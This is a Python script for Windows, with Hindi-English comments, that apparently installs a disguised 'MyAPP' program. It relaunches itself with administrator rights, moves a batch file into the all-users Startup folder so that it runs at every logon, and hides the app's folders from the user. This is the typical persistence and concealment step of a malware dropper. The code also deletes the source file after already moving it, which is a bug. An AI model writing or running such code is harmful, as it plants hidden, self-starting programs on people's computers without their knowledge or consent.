import shutil
import os
import sys
import ctypes
import time
from main4 import hide_folder

time.sleep(1)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # Re-run the program with administrator privileges
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
else:
    print("Running with admin privileges!")

def move_and_hide_file(source_file, destination_folder):
    # File ko dusre folder mein transfer karna
    shutil.move(source_file, destination_folder)

source_file = os.path.expanduser('~') + '\\Downloads\\MyAPP\\MyAPP\\main.bat' 
destination_folder = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'

try:
    move_and_hide_file(source_file, destination_folder)
    os.remove(source_file)  # Original file ko delete karna
except PermissionError as e:
    print(f"Permission error: {e}")
except Exception as e:
    print(f"An error occurred: {e}")

current_folder = os.path.expanduser('~') + '\\Downloads\\MyAPP\\MyAPP'
hide_folder(current_folder)

paths = os.path.expanduser('~') + '\\Downloads\\MyAPP\\MyAPP\\main'
hide_folder(paths)